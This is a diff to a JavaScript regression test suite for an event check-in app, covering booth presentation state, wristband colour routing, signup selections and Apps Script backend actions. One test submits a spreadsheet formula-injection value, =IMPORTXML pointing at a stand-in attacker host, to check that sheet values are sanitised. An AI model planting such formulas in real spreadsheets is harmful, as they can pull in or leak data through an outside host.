@@ -59,6 +59,11 @@ function listHtmlFiles(directory) {
   });
 }
 
+function assertIsoTimestamp(value, label = "timestamp") {
+  assert.equal(typeof value, "string", `${label} should be a string`);
+  assert.equal(Number.isNaN(Date.parse(value)), false, `${label} should be valid ISO time`);
+}
+
 function runInlineScriptSyntaxRegression() {
   const webRoot = path.join(__dirname, "..", "..", "web");
   listHtmlFiles(webRoot).forEach((filename) => {
@@ -84,6 +89,74 @@ async function runApiRegression(port) {
   res = await request(port, "verifyOrganizer", { organizerKey });
   assert.deepEqual(res.body, { ok: true });
 
+  // Booth presentation state is public and PII-free. Each booth starts with
+  // an independent waiting state; only an authenticated organizer can change
+  // the state for the booth they name.
+  res = await request(port, "boothPresentation", { boothId: "art" });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.boothId, "art");
+  assert.equal(res.body.stepIndex, 0);
+  assert.equal(res.body.status, "waiting");
+  assert.equal(res.body.message, "");
+  assert.equal(res.body.version, 0);
+  assert.equal(res.body.createdAt, null);
+  assert.equal(res.body.updatedAt, null);
+  assertIsoTimestamp(res.body.serverNow, "booth presentation serverNow");
+  assert.equal("recentCheckins" in res.body, false);
+
+  res = await request(port, "boothPresentation", { boothId: "unknown" });
+  assert.equal(res.status, 404);
+  assert.equal(res.body.code, "BOOTH_NOT_FOUND");
+  res = await request(port, "updateBoothPresentation", {
+    boothId: "art", stepIndex: 1, status: "live", message: "Begin", organizerKey: "wrong",
+  });
+  assert.equal(res.status, 401);
+  assert.equal(res.body.code, "AUTH_REQUIRED");
+  res = await request(port, "updateBoothPresentation", {
+    boothId: "art", stepIndex: 1, status: "not-a-status", message: "Begin", organizerKey,
+  });
+  assert.equal(res.status, 400);
+  assert.equal(res.body.code, "INVALID_PRESENTATION_STATUS");
+  res = await request(port, "updateBoothPresentation", {
+    boothId: "art", stepIndex: 1, status: "live", message: "x".repeat(501), organizerKey,
+  });
+  assert.equal(res.status, 400);
+  assert.equal(res.body.code, "INVALID_PRESENTATION_MESSAGE");
+
+  res = await request(port, "updateBoothPresentation", {
+    boothId: "art", stepIndex: 2, status: "live", message: "  Start drawing now.  ", organizerKey,
+  });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.boothId, "art");
+  assert.equal(res.body.stepIndex, 2);
+  assert.equal(res.body.status, "live");
+  assert.equal(res.body.message, "Start drawing now.");
+  assert.equal(res.body.version, 1);
+  assertIsoTimestamp(res.body.createdAt, "presentation createdAt");
+  assertIsoTimestamp(res.body.updatedAt, "presentation updatedAt");
+  assertIsoTimestamp(res.body.serverNow, "presentation update serverNow");
+  const presentationCreatedAt = res.body.createdAt;
+
+  res = await request(port, "updateBoothPresentation", {
+    boothId: "art", stepIndex: 4, status: "wrap", message: "Stale", version: 0, organizerKey,
+  });
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "PRESENTATION_CONFLICT");
+
+  res = await request(port, "boothPresentation", { boothId: "heaven" });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.boothId, "heaven");
+  assert.equal(res.body.version, 0);
+  assert.equal(res.body.status, "waiting");
+  res = await request(port, "updateBoothPresentation", {
+    boothId: "art", stepIndex: 3, status: "paused", message: "Hold here.", version: 1, organizerKey,
+  });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.version, 2);
+  assert.equal(res.body.createdAt, presentationCreatedAt);
+  assert.equal(res.body.status, "paused");
+  assert.equal(res.body.message, "Hold here.");
+
   for (const invalidPhone of ["615555010", "16155550101"]) {
     res = await request(port, "findOrRegisterByPhone", {
       phone: invalidPhone,
@@ -98,6 +171,7 @@ async function runApiRegression(port) {
   res = await request(port, "registerAttendee", { attendeeId: "entry-a", name: "Avery" });
   assert.equal(res.body.raffleNumber, "1001");
   assert.equal(res.body.isNew, true);
+  assert.equal(res.body.wristbandColor, null);
   res = await request(port, "registerAttendee", { attendeeId: "entry-a", name: "Avery" });
   assert.equal(res.body.isNew, false);
 
@@ -115,13 +189,13 @@ async function runApiRegression(port) {
     portal: "phase3",
   });
   assert.equal(res.status, 200);
-  assert.deepEqual(res.body, {
-    attendeeId: "entry-a",
-    name: "Avery",
-    raffleNumber: "1001",
-    wristbandConfirmed: false,
-    phoneLinked: false,
-  });
+  assert.equal(res.body.attendeeId, "entry-a");
+  assert.equal(res.body.name, "Avery");
+  assert.equal(res.body.raffleNumber, "1001");
+  assert.equal(res.body.wristbandConfirmed, false);
+  assert.equal(res.body.wristbandColor, null);
+  assert.equal(res.body.phoneLinked, false);
+  assertIsoTimestamp(res.body.serverNow, "attendee login serverNow");
   assert.equal("phone" in res.body, false);
 
   res = await request(port, "loginAttendee", {
@@ -139,7 +213,19 @@ async function runApiRegression(port) {
   assert.equal(JSON.parse(fs.readFileSync(testDb, "utf8")).attendees.length, 1);
 
   res = await request(port, "confirmWristband", { attendeeId: "entry-a" });
+  assert.equal(res.status, 400);
+  assert.equal(res.body.code, "INVALID_WRISTBAND_COLOR");
+  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: "purple" });
+  assert.equal(res.status, 400);
+  assert.equal(res.body.code, "INVALID_WRISTBAND_COLOR");
+  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: " Blue " });
   assert.equal(res.status, 200);
+  assert.equal(res.body.wristbandColor, "blue");
+  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: "blue" });
+  assert.equal(res.status, 200);
+  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: "red" });
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "WRISTBAND_ALREADY_ASSIGNED");
   res = await request(port, "loginAttendee", {
     name: "Avery",
     raffleNumber: "1001",
@@ -147,9 +233,13 @@ async function runApiRegression(port) {
   });
   assert.equal(res.status, 200);
   assert.equal(res.body.wristbandConfirmed, true);
+  assert.equal(res.body.wristbandColor, "blue");
+  assertIsoTimestamp(res.body.serverNow, "phase 2 login serverNow");
   res = await request(port, "attendeePortalSession", { attendeeId: "entry-a", portal: "phase2" });
   assert.equal(res.status, 200);
   assert.equal(res.body.attendeeId, "entry-a");
+  assert.equal(res.body.wristbandColor, "blue");
+  assertIsoTimestamp(res.body.serverNow, "restored session serverNow");
 
   res = await request(port, "findOrRegisterByPhone", {
     phone: "615-555-0101",
@@ -219,6 +309,18 @@ async function runApiRegression(port) {
     .filter((checkin) => checkin.attendeeId === "entry-a" && checkin.boothId === "art");
   assert.equal(artRows.length, 1);
   assert.equal(artRows[0].rating, 4);
+  res = await request(port, "boothCheckin", {
+    attendeeId: "entry-a",
+    boothId: "art",
+    boothName: "Art Therapy Table",
+    checkedInBy: "scheduled-attendee",
+    extraData: { sessionNumber: 2, wristbandColor: "blue" },
+  });
+  assert.equal(res.status, 200);
+  const mergedArtRow = JSON.parse(fs.readFileSync(testDb, "utf8")).boothCheckins
+    .find((checkin) => checkin.attendeeId === "entry-a" && checkin.boothId === "art");
+  assert.equal(mergedArtRow.rating, 4);
+  assert.equal(mergedArtRow.extraData.sessionNumber, 2);
 
   res = await request(port, "myCheckins", { phone: "6155550101" });
   assert.equal(res.status, 400);
@@ -295,9 +397,17 @@ async function runApiRegression(port) {
   assert.deepEqual(res.body.recentCheckins.map((checkin) => checkin.name), ["Avery"]);
   assert.equal("phone" in res.body.recentCheckins[0], false);
   assert.equal("signups" in res.body, false);
+  assert.equal(res.body.presentation.boothId, "art");
+  assert.equal(res.body.presentation.stepIndex, 3);
+  assert.equal(res.body.presentation.status, "paused");
+  assert.equal(res.body.presentation.message, "Hold here.");
+  assert.equal(res.body.presentation.version, 2);
+  assertIsoTimestamp(res.body.serverNow, "booth dashboard serverNow");
   res = await request(port, "boothDashboardData", { boothId: "newsong", organizerKey });
   assert.equal(res.body.totalCheckins, 1);
   assert.deepEqual(res.body.recentCheckins.map((checkin) => checkin.name), ["Casey"]);
+  assert.equal(res.body.presentation.boothId, "newsong");
+  assert.equal(res.body.presentation.version, 0);
 
   // A public attendee cannot claim somebody else's phone and receives no PII.
   res = await request(port, "registerAttendee", { attendeeId: "entry-d", name: "Drew" });
@@ -311,6 +421,27 @@ async function runApiRegression(port) {
   assert.equal(res.body.code, "PHONE_ALREADY_LINKED");
   assert.equal("name" in res.body, false);
   assert.equal("raffleNumber" in res.body, false);
+
+  res = await request(port, "saveSignupSelections", {
+    attendeeId: "entry-d",
+    optionIds: ["future", "art", "future"],
+  });
+  assert.equal(res.status, 200);
+  assert.deepEqual(res.body.optionIds, ["future", "art"]);
+  const drewArtSignupId = res.body.signupIds[1];
+  res = await request(port, "mySignupSelections", { attendeeId: "entry-d" });
+  assert.deepEqual(res.body.optionIds, ["future", "art"]);
+  res = await request(port, "saveSignupSelections", { attendeeId: "entry-d", optionIds: ["art"] });
+  assert.equal(res.status, 200);
+  assert.deepEqual(res.body.optionIds, ["art"]);
+  assert.equal(res.body.signupIds[0], drewArtSignupId);
+  res = await request(port, "saveSignupSelections", { attendeeId: "entry-d", optionIds: [] });
+  assert.deepEqual(res.body.optionIds, []);
+  res = await request(port, "mySignupSelections", { attendeeId: "entry-d" });
+  assert.deepEqual(res.body.optionIds, []);
+  res = await request(port, "saveSignupSelections", { attendeeId: "entry-d", optionIds: ["invalid"] });
+  assert.equal(res.status, 400);
+  assert.equal(res.body.code, "INVALID_SIGNUP_OPTIONS");
 
   // A self-service page opened without completing Entry cannot create a
   // hidden raffle record (including after a rehearsal reset).
@@ -329,6 +460,17 @@ async function runApiRegression(port) {
     optionTitle: "Future events",
   });
   const signupId = res.body.signupId;
+  assert.equal(res.body.updated, undefined);
+  res = await request(port, "submitSignup", {
+    attendeeId: "entry-a",
+    phone: "(615) 555-0101",
+    optionId: "future",
+    optionTitle: "Keep me posted on future events",
+  });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.signupId, signupId);
+  assert.equal(res.body.updated, true);
+  assert.equal(JSON.parse(fs.readFileSync(testDb, "utf8")).signups.length, 1);
   res = await request(port, "submitSignup", {
     attendeeId: "entry-a",
     phone: "(615) 555-0101",
@@ -365,6 +507,9 @@ async function runApiRegression(port) {
   assert.equal(res.status, 200);
   res = await request(port, "dashboardData", { organizerKey });
   assert.equal(res.body.totals.registered, 0);
+  res = await request(port, "boothPresentation", { boothId: "art" });
+  assert.equal(res.body.status, "waiting");
+  assert.equal(res.body.version, 0);
   res = await request(port, "myCheckins", { attendeeId: "entry-a" });
   assert.equal(res.status, 404);
   assert.equal(res.body.code, "ATTENDEE_NOT_FOUND");
@@ -477,7 +622,9 @@ async function runFrontendContractRegression() {
           attendeeId: "portal-attendee",
           name: name.trim(),
           raffleNumber,
+          wristbandColor: "blue",
           phoneLinked: false,
+          serverNow: "2026-07-18T20:10:00.000Z",
         };
       },
       attendeePortalSession: async (attendeeId, portal) => {
@@ -487,6 +634,7 @@ async function runFrontendContractRegression() {
           name: "Jordan Lee",
           raffleNumber: "1001",
           phoneLinked: true,
+          serverNow: "2026-07-18T20:11:00.000Z",
         };
       },
     },
@@ -504,13 +652,20 @@ async function runFrontendContractRegression() {
   const attendeePortal = identityContext.__attendeePortal;
   let portalIdentity = await attendeePortal.signIn("phase2.heaven", "Jordan Lee", "1001");
   assert.equal(portalIdentity.attendeeId, "portal-attendee");
+  assert.equal(portalIdentity.wristbandColor, "blue");
   assert.equal(attendeePortal.hasAccess("phase2.heaven"), true);
   assert.equal(attendeePortal.hasAccess("phase2.trivia"), false);
   assert.equal(attendeePortal.hasAccess("phase3"), false);
   assert.deepEqual(backendPortalCalls[0], ["login", "phase2"]);
   portalIdentity = await attendeePortal.restore("phase2.heaven");
   assert.equal(portalIdentity.phoneLinked, true);
+  assert.equal(portalIdentity.wristbandColor, "blue");
   assert.deepEqual(backendPortalCalls[1], ["restore", "phase2"]);
+  portalIdentity = await attendeePortal.continueAs("phase2");
+  assert.equal(portalIdentity.attendeeId, "portal-attendee");
+  assert.equal(portalIdentity.wristbandColor, "blue");
+  assert.equal(attendeePortal.hasAccess("phase2"), true);
+  assert.deepEqual(backendPortalCalls[2], ["restore", "phase2"]);
   await attendeePortal.signIn("phase2.trivia", "Jordan Lee", "1001");
   assert.equal(attendeePortal.hasAccess("phase2.heaven"), true);
   assert.equal(attendeePortal.hasAccess("phase2.trivia"), true);
@@ -535,6 +690,10 @@ async function runFrontendContractRegression() {
   vm.runInContext(`${apiSource}\nthis.__eventApi = EventAPI;`, apiContext);
   assert.equal(typeof apiContext.__eventApi.loginAttendee, "function");
   assert.equal(typeof apiContext.__eventApi.boothDashboardData, "function");
+  assert.equal(typeof apiContext.__eventApi.boothPresentation, "function");
+  assert.equal(typeof apiContext.__eventApi.updateBoothPresentation, "function");
+  assert.equal(typeof apiContext.__eventApi.saveSignupSelections, "function");
+  assert.equal(typeof apiContext.__eventApi.mySignupSelections, "function");
   await assert.rejects(
     () => apiContext.__eventApi.dashboardData("wrong"),
     (error) => error.code === "AUTH_REQUIRED" && error.status === 200
@@ -632,8 +791,11 @@ async function runFrontendContractRegression() {
   const boothsConfigSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "booths-config.js"), "utf8");
   const boothsConfigContext = {};
   vm.createContext(boothsConfigContext);
-  vm.runInContext(`${boothsConfigSource}\nthis.__booths = CONNECTOR_BOOTHS;`, boothsConfigContext);
+  vm.runInContext(`${boothsConfigSource}\nthis.__booths = CONNECTOR_BOOTHS; this.__wristbandColors = WRISTBAND_COLORS; this.__routes = WRISTBAND_ROUTES; this.__sessions = BOOTH_SESSIONS;`, boothsConfigContext);
   const boothConfigs = Array.from(boothsConfigContext.__booths, (booth) => ({ ...booth }));
+  const eventScheduleSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "event-schedule.js"), "utf8");
+  vm.runInContext(`${eventScheduleSource}\nthis.__eventSchedule = EventSchedule;`, boothsConfigContext);
+  const eventSchedule = boothsConfigContext.__eventSchedule;
   assert.match(dashboardSource, /if \(!OrganizerAuth\.isCurrent\(authGeneration\)\) return false/);
   assert.match(dashboardSource, /groupSignupsByOption\(data\.signups\)/);
   assert.match(dashboardSource, /Phone\.formatDisplay\(s\.phone\)/);
@@ -642,13 +804,21 @@ async function runFrontendContractRegression() {
   assert.match(artKioskSource, /OrganizerAuth\.isCurrent\(authGeneration\)/);
   assert.match(songKioskSource, /let isSaving = false/);
   assert.match(songKioskSource, /if \(isSaving \|\| !currentVisitor\) return/);
-  assert.doesNotMatch(phase1Source, /window\.location\.href = "\.\.\/phase2-booths\/hub\.html"/);
   assert.match(phase1Source, /Phase 1 complete/);
   assert.match(phase1Source, /Thank you/);
-  assert.match(phase1Source, /when you get to a booth/i);
-  assert.match(phase1Source, /close this link now/i);
-  assert.doesNotMatch(phase2Source, /AttendeePortal|phase2-login/);
-  assert.match(phase2Source, /no longer has one shared attendee portal/i);
+  assert.match(phase1Source, /name="wristband-color"/);
+  assert.match(phase1Source, /EventAPI\.confirmWristband\(identity\.attendeeId, selectedWristbandColor\)/);
+  assert.match(phase1Source, /href="\.\.\/phase2-booths\/hub\.html"/);
+  assert.match(phase1Source, /Open my booth schedule/i);
+  assert.match(phase2Source, /shared\/attendee-portal\.js/);
+  assert.match(phase2Source, /shared\/event-schedule\.js/);
+  assert.match(phase2Source, /AttendeePortal\.signIn\(PORTAL/);
+  assert.match(phase2Source, /AttendeePortal\.continueAs\(PORTAL\)/);
+  assert.match(phase2Source, /EventSchedule\.currentBooth/);
+  assert.match(phase2Source, /EventAPI\.boothPresentation/);
+  assert.match(phase2Source, /id="attendee-name"/);
+  assert.match(phase2Source, /id="attendee-raffle"/);
+  assert.match(phase2Source, /id="session-countdown"/);
   assert.doesNotMatch(phase2Source, /window\.location\.href = "\.\.\/phase3-signup\/index\.html"/);
   assert.match(boothRoomSource, /const portal = `phase2\.\$\{boothId\}`/);
   assert.match(boothRoomSource, /AttendeePortal\.signIn\(portal/);
@@ -658,14 +828,63 @@ async function runFrontendContractRegression() {
   assert.match(boothCommonSource, /completeBoothRoom/);
   assert.match(boothCommonSource, /const identity = _boothIdentity \|\| Identity\.peek\(\)/);
   assert.match(phase3Source, /AttendeePortal\.signIn\("phase3"/);
+  assert.match(phase3Source, /AttendeePortal\.continueAs\("phase3"\)/);
   assert.doesNotMatch(phase3Source, /AttendeePortal\.prefill/);
-  assert.match(phase3Source, /id="phase3-name"[^>]*autocomplete="off"/);
-  assert.match(phase3Source, /you can continue even if you skipped the booths/i);
+  assert.match(phase3Source, /id="phase3-name"[^>]*autocomplete="name"/);
+  assert.match(phase3Source, /role="checkbox"/);
+  assert.match(phase3Source, /Tick and go/i);
+  assert.match(phase3Source, /EventAPI\.saveSignupSelections/);
+  assert.match(phase3Source, /EventAPI\.mySignupSelections/);
+  assert.doesNotMatch(phase3Source, /id="detail-email"|id="detail-comment"|class="star-row"/);
   assert.match(doneSource, /AttendeePortal\.restore\("phase3"\)/);
 
   assert.equal(boothConfigs.length, 5);
   assert.equal(new Set(boothConfigs.map((booth) => booth.page)).size, 5);
   assert.equal(new Set(boothConfigs.map((booth) => booth.staffPage)).size, 5);
+
+  const expectedRoutes = {
+    blue: ["heaven", "trivia", "story"],
+    red: ["trivia", "heaven", "art"],
+    orange: ["art", "story", "newsong"],
+    green: ["newsong", "art", "heaven"],
+    yellow: ["story", "newsong", "trivia"],
+  };
+  assert.deepEqual(
+    Array.from(boothsConfigContext.__wristbandColors, (color) => color.id),
+    ["blue", "red", "orange", "green", "yellow"]
+  );
+  Object.entries(expectedRoutes).forEach(([color, expectedRoute]) => {
+    assert.deepEqual(Array.from(eventSchedule.route(color)), expectedRoute, `${color} wristband route`);
+  });
+  const allBoothIds = boothConfigs.map((booth) => booth.id).sort();
+  [0, 1, 2].forEach((sessionIndex) => {
+    const assignedBooths = Object.values(expectedRoutes).map((route) => route[sessionIndex]);
+    assert.equal(new Set(assignedBooths).size, 5, `session ${sessionIndex + 1} should assign each booth once`);
+    assert.deepEqual(assignedBooths.slice().sort(), allBoothIds);
+  });
+
+  const atSession1 = eventSchedule.stateAt(Date.parse("2026-07-18T15:10:00-05:00"));
+  assert.equal(atSession1.phase, "active");
+  assert.equal(atSession1.sessionIndex, 0);
+  assert.equal(atSession1.session.number, 1);
+  assert.equal(atSession1.remainingMs, 20 * 60 * 1000);
+  const atSession2 = eventSchedule.stateAt(Date.parse("2026-07-18T15:30:00-05:00"));
+  assert.equal(atSession2.phase, "active");
+  assert.equal(atSession2.sessionIndex, 1);
+  assert.equal(atSession2.session.number, 2);
+  const atSession3 = eventSchedule.stateAt(Date.parse("2026-07-18T15:50:00-05:00"));
+  assert.equal(atSession3.phase, "active");
+  assert.equal(atSession3.sessionIndex, 2);
+  assert.equal(atSession3.session.number, 3);
+  const atExperienceEnd = eventSchedule.stateAt(Date.parse("2026-07-18T16:10:00-05:00"));
+  assert.equal(atExperienceEnd.phase, "ended");
+  assert.equal(atExperienceEnd.sessionIndex, null);
+  assert.equal(atExperienceEnd.remainingMs, 0);
+  assert.equal(eventSchedule.currentBooth("blue", atSession1).id, "heaven");
+  assert.equal(eventSchedule.currentBooth("blue", atSession2).id, "trivia");
+  assert.equal(eventSchedule.currentBooth("blue", atSession3).id, "story");
+  assert.equal(eventSchedule.currentBooth("blue", atExperienceEnd), null);
+  assert.equal(eventSchedule.formatCountdown(20 * 60 * 1000), "20:00");
 
   [dashboardSource, artKioskSource, songKioskSource].forEach((source) => {
     assert.match(source, /shared\/phone\.js/);
@@ -690,6 +909,8 @@ async function runFrontendContractRegression() {
 
   const boothStaffCommon = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "booth-staff-common.js"), "utf8");
   assert.match(boothStaffCommon, /EventAPI\.boothDashboardData/);
+  assert.match(boothStaffCommon, /EventAPI\.updateBoothPresentation/);
+  assert.match(boothStaffCommon, /EventSchedule\.groupForBooth/);
   assert.doesNotMatch(boothStaffCommon, /EventAPI\.dashboardData\(/);
   ["heaven", "trivia", "story", "art", "newsong"].forEach((boothId) => {
     const source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-staff", `${boothId}.html`), "utf8");
@@ -782,10 +1003,14 @@ function runAppsScriptRegression() {
     actionFindOrRegisterByPhone,
     actionBoothCheckin,
     actionSubmitSignup,
+    actionSaveSignupSelections,
     actionConfirmSignupInPerson,
     actionDashboardData,
+    actionBoothPresentation,
+    actionUpdateBoothPresentation,
     actionBoothDashboardData,
     actionMyCheckins,
+    actionMySignupSelections,
     sheetSafeValue,
     nextRaffleNumber,
     withScriptLock,
@@ -807,7 +1032,9 @@ function runAppsScriptRegression() {
   );
   result = gas.actionLoginAttendee({ name: " aVeRy ", raffleNumber: "#1001", portal: "phase3" });
   assert.equal(result.attendeeId, "gas-entry-a");
+  assert.equal(result.wristbandColor, null);
   assert.equal(result.phoneLinked, false);
+  assertIsoTimestamp(result.serverNow, "Apps Script attendee serverNow");
   assert.equal("phone" in result, false);
   assert.throws(
     () => gas.actionLoginAttendee({ name: "Wrong", raffleNumber: "1001", portal: "phase3" }),
@@ -853,7 +1080,17 @@ function runAppsScriptRegression() {
   assert.equal(result.raffleNumber, "1001");
 
   const beforeAttendeeDependentWrites = lockState.acquisitions;
-  gas.actionConfirmWristband({ attendeeId: "gas-entry-a" });
+  assert.throws(
+    () => gas.actionConfirmWristband({ attendeeId: "gas-entry-a" }),
+    (error) => error.code === "INVALID_WRISTBAND_COLOR"
+  );
+  assert.throws(
+    () => gas.actionConfirmWristband({ attendeeId: "gas-entry-a", wristbandColor: "purple" }),
+    (error) => error.code === "INVALID_WRISTBAND_COLOR"
+  );
+  assert.equal(lockState.acquisitions, beforeAttendeeDependentWrites);
+  result = gas.actionConfirmWristband({ attendeeId: "gas-entry-a", wristbandColor: " BLUE " });
+  assert.equal(result.wristbandColor, "blue");
   const gasSignup = gas.actionSubmitSignup({
     attendeeId: "gas-entry-a",
     phone: "6155550101",
@@ -868,8 +1105,39 @@ function runAppsScriptRegression() {
   assert.equal(lockState.acquisitions, beforeAttendeeDependentWrites + 3);
   result = gas.actionLoginAttendee({ name: "Avery", raffleNumber: "1001", portal: "phase2" });
   assert.equal(result.wristbandConfirmed, true);
+  assert.equal(result.wristbandColor, "blue");
+  assertIsoTimestamp(result.serverNow, "Apps Script Phase 2 login serverNow");
   result = gas.actionAttendeePortalSession({ attendeeId: "gas-entry-a", portal: "phase2" });
   assert.equal(result.attendeeId, "gas-entry-a");
+  assert.equal(result.wristbandColor, "blue");
+  assertIsoTimestamp(result.serverNow, "Apps Script restored session serverNow");
+
+  const duplicateGasSignup = gas.actionSubmitSignup({
+    attendeeId: "gas-entry-a",
+    phone: "(615) 555-0101",
+    optionId: "formula-test",
+    optionTitle: "=IMPORTXML(\"https://attacker.example\")",
+  });
+  assert.equal(duplicateGasSignup.signupId, gasSignup.signupId);
+  assert.equal(duplicateGasSignup.updated, true);
+  result = gas.actionSaveSignupSelections({
+    attendeeId: "gas-entry-a",
+    optionIds: ["future", "art", "future"],
+  });
+  assert.deepEqual(Array.from(result.optionIds), ["future", "art"]);
+  const gasArtSignupId = result.signupIds[1];
+  result = gas.actionMySignupSelections({ attendeeId: "gas-entry-a" });
+  assert.deepEqual(Array.from(result.optionIds), ["future", "art"]);
+  result = gas.actionSaveSignupSelections({ attendeeId: "gas-entry-a", optionIds: ["art"] });
+  assert.deepEqual(Array.from(result.optionIds), ["art"]);
+  assert.equal(result.signupIds[0], gasArtSignupId);
+  result = gas.actionSaveSignupSelections({ attendeeId: "gas-entry-a", optionIds: [] });
+  assert.deepEqual(Array.from(result.optionIds), []);
+  assert.deepEqual(Array.from(gas.actionMySignupSelections({ attendeeId: "gas-entry-a" }).optionIds), []);
+  assert.throws(
+    () => gas.actionSaveSignupSelections({ attendeeId: "gas-entry-a", optionIds: ["invalid"] }),
+    (error) => error.code === "INVALID_SIGNUP_OPTIONS"
+  );
   assert.equal(gas.sheetSafeValue("=SUM(1,2)"), "'=SUM(1,2)");
   assert.equal(gas.sheetSafeValue("  =SUM(1,2)"), "'  =SUM(1,2)");
   assert.equal(gas.sheetSafeValue("\t=SUM(1,2)"), "'\t=SUM(1,2)");
@@ -933,6 +1201,70 @@ function runAppsScriptRegression() {
   result = gas.actionMyCheckins({ attendeeId: kioskId });
   assert.deepEqual(Array.from(result.boothIds), ["newsong"]);
 
+  result = gas.actionBoothPresentation({ boothId: "art" });
+  assert.equal(result.boothId, "art");
+  assert.equal(result.stepIndex, 0);
+  assert.equal(result.status, "waiting");
+  assert.equal(result.message, "");
+  assert.equal(result.version, 0);
+  assertIsoTimestamp(result.serverNow, "Apps Script booth serverNow");
+  assert.throws(
+    () => gas.actionBoothPresentation({ boothId: "unknown" }),
+    (error) => error.code === "BOOTH_NOT_FOUND"
+  );
+
+  const beforePresentationWrites = lockState.acquisitions;
+  assert.throws(
+    () => gas.actionUpdateBoothPresentation({
+      boothId: "art", stepIndex: 1, status: "live", message: "Begin", organizerKey: "wrong",
+    }),
+    (error) => error.code === "AUTH_REQUIRED"
+  );
+  assert.throws(
+    () => gas.actionUpdateBoothPresentation({
+      boothId: "art", stepIndex: 1, status: "invalid", message: "Begin", organizerKey: "gas-organizer-key",
+    }),
+    (error) => error.code === "INVALID_PRESENTATION_STATUS"
+  );
+  assert.equal(lockState.acquisitions, beforePresentationWrites);
+  result = gas.actionUpdateBoothPresentation({
+    boothId: "art",
+    stepIndex: 2,
+    status: "live",
+    message: "  Start drawing now.  ",
+    organizerKey: "gas-organizer-key",
+  });
+  assert.equal(result.version, 1);
+  assert.equal(result.message, "Start drawing now.");
+  assert.equal(result.status, "live");
+  assertIsoTimestamp(result.createdAt, "Apps Script presentation createdAt");
+  const gasPresentationCreatedAt = result.createdAt;
+  assert.throws(
+    () => gas.actionUpdateBoothPresentation({
+      boothId: "art",
+      stepIndex: 4,
+      status: "wrap",
+      message: "Stale",
+      version: 0,
+      organizerKey: "gas-organizer-key",
+    }),
+    (error) => error.code === "PRESENTATION_CONFLICT"
+  );
+  result = gas.actionUpdateBoothPresentation({
+    boothId: "art",
+    stepIndex: 3,
+    status: "wrap",
+    message: "Finish your last detail.",
+    version: 1,
+    organizerKey: "gas-organizer-key",
+  });
+  assert.equal(result.version, 2);
+  assert.equal(result.createdAt, gasPresentationCreatedAt);
+  assert.equal(result.status, "wrap");
+  result = gas.actionBoothPresentation({ boothId: "heaven" });
+  assert.equal(result.version, 0);
+  assert.equal(result.status, "waiting");
+
   const beforeUnauthorizedBooth = lockState.acquisitions;
   assert.throws(
     () => gas.actionBoothDashboardData({ boothId: "newsong", organizerKey: "wrong" }),
@@ -949,6 +1281,13 @@ function runAppsScriptRegression() {
   assert.deepEqual(Array.from(result.recentCheckins, (checkin) => checkin.name), ["Casey"]);
   assert.equal("phone" in result.recentCheckins[0], false);
   assert.equal("signups" in result, false);
+  assert.equal(result.presentation.boothId, "newsong");
+  assert.equal(result.presentation.version, 0);
+  assertIsoTimestamp(result.serverNow, "Apps Script booth dashboard serverNow");
+  result = gas.actionBoothDashboardData({ boothId: "art", organizerKey: "gas-organizer-key" });
+  assert.equal(result.presentation.stepIndex, 3);
+  assert.equal(result.presentation.status, "wrap");
+  assert.equal(result.presentation.version, 2);
 
   assert.throws(
     () => gas.actionDashboardData({ organizerKey: "wrong" }),
@@ -969,6 +1308,10 @@ function runAppsScriptRegression() {
     () => gas.actionMyCheckins({ attendeeId: "missing-public-id" }),
     (error) => error.code === "ATTENDEE_NOT_FOUND"
   );
+  assert.throws(
+    () => gas.actionMySignupSelections({ attendeeId: "missing-public-id" }),
+    (error) => error.code === "ATTENDEE_NOT_FOUND"
+  );
 
   function post(action, payload) {
     const output = gas.doPost({ pathInfo: action, postData: { contents: JSON.stringify(payload || {}) } });
@@ -979,6 +1322,7 @@ function runAppsScriptRegression() {
   assert.equal(post("loginAttendee", { name: "HTTP", raffleNumber: "1004", portal: "phase3" }).attendeeId, "gas-http-entry");
   assert.equal(post("dashboardData", { organizerKey: "wrong" }).code, "AUTH_REQUIRED");
   assert.equal(post("myCheckins", {}).code, "ATTENDEE_ID_REQUIRED");
+  assert.equal(post("mySignupSelections", {}).code, "ATTENDEE_ID_REQUIRED");
   assert.equal(post("doesNotExist", {}).code, "UNKNOWN_ACTION");
 
   assert.throws(
